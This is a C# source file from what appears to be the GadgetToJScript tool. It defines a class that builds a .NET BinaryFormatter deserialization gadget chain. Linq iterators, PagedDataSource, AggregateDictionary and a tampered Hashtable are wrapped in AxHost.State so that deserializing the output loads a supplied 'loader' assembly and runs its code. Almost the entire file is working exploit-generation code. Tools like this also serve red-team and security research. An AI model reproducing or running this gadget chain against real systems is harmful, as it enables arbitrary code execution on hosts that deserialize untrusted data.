using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel.Design;
using System.Data;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Web.UI.WebControls;

namespace GadgetToJScript
{
    [Serializable]
    public class _ASurrogateGadgetGenerator: ISerializable
    {
        protected byte[] assemblyBytes;
        public _ASurrogateGadgetGenerator(Assembly _SHLoaderAssembly)
        {
            this.assemblyBytes = File.ReadAllBytes(_SHLoaderAssembly.Location);
        }

        protected _ASurrogateGadgetGenerator(SerializationInfo info, StreamingContext context)
        {
        }
        private IEnumerable<TResult> GetEnum<TSource, TResult>(IEnumerable<TSource> src, Func<TSource, bool> predicate, Func<TSource, TResult> selector)
        {
            Type t = Assembly.Load("System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
              .GetType("System.Linq.Enumerable+WhereSelectEnumerableIterator`2")
              .MakeGenericType(typeof(TSource), typeof(TResult));
            return t.GetConstructors()[0].Invoke(new object[] { src, predicate, selector }) as IEnumerable<TResult>;
        }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {

            DesignerVerb verb = new DesignerVerb("000", null);
            Hashtable ht = new Hashtable();
            List<object> ls = new List<object>();

            try
            {
                List<byte[]> data = new List<byte[]>();
                data.Add(this.assemblyBytes);
                byte[][] e1 = new byte[][] { assemblyBytes };

                IEnumerable<Assembly> e2 = GetEnum<byte[], Assembly>(e1, null, Assembly.Load);
                IEnumerable<IEnumerable<Type>> e3 = GetEnum<Assembly, IEnumerable<Type>>(e2,
                    null,
                    (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate
                        (
                            typeof(Func<Assembly, IEnumerable<Type>>),
                            typeof(Assembly).GetMethod("GetTypes")
                        )
                );

                IEnumerable<IEnumerator<Type>> e4 = GetEnum<IEnumerable<Type>, IEnumerator<Type>>(e3,
                    null,
                    (Func<IEnumerable<Type>, IEnumerator<Type>>)Delegate.CreateDelegate
                    (
                        typeof(Func<IEnumerable<Type>, IEnumerator<Type>>),
                        typeof(IEnumerable<Type>).GetMethod("GetEnumerator")
                    )
                );
                IEnumerable<Type> e5 = GetEnum<IEnumerator<Type>, Type>(e4,
                    (Func<IEnumerator<Type>, bool>)Delegate.CreateDelegate
                    (
                        typeof(Func<IEnumerator<Type>, bool>),
                        typeof(IEnumerator).GetMethod("MoveNext")
                    ),
                    (Func<IEnumerator<Type>, Type>)Delegate.CreateDelegate
                    (
                        typeof(Func<IEnumerator<Type>, Type>),
                        typeof(IEnumerator<Type>).GetProperty("Current").GetGetMethod()
                    )
                );

                IEnumerable<object> end = GetEnum<Type, object>(e5, null, Activator.CreateInstance);
                PagedDataSource pds = new PagedDataSource() { DataSource = end };
                IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);

                verb = new DesignerVerb("", null);

                typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);

                ls.Add(e1);
                ls.Add(e2);
                ls.Add(e3);
                ls.Add(e4);
                ls.Add(e5);
                ls.Add(end);
                ls.Add(pds);
                ls.Add(verb);
                ls.Add(dict);

                ht.Add(verb, "");
                ht.Add("", "");

                FieldInfo fi_keys = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
                Array keys = (Array)fi_keys.GetValue(ht);
                FieldInfo fi_key = keys.GetType().GetElementType().GetField("key", BindingFlags.Public | BindingFlags.Instance);
                for (int i = 0; i < keys.Length; ++i)
                {
                    object bucket = keys.GetValue(i);
                    object key = fi_key.GetValue(bucket);
                    if (key is string)
                    {
                        fi_key.SetValue(bucket, verb);
                        keys.SetValue(bucket, i);
                        break;
                    }
                }

                fi_keys.SetValue(ht, keys);

                ls.Add(ht);

                BinaryFormatter fmt = new BinaryFormatter();
                MemoryStream stm = new MemoryStream();
                fmt.SurrogateSelector = new _SurrogateSelector();
                fmt.Serialize(stm, ls);
                info.SetType(typeof(System.Windows.Forms.AxHost.State));
                info.AddValue("PropertyBagBinary", stm.ToArray());
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error _ASurrogateGadgetGenerator: " + ex.Message + " : " + ex.StackTrace);
            }
        }


    }
}
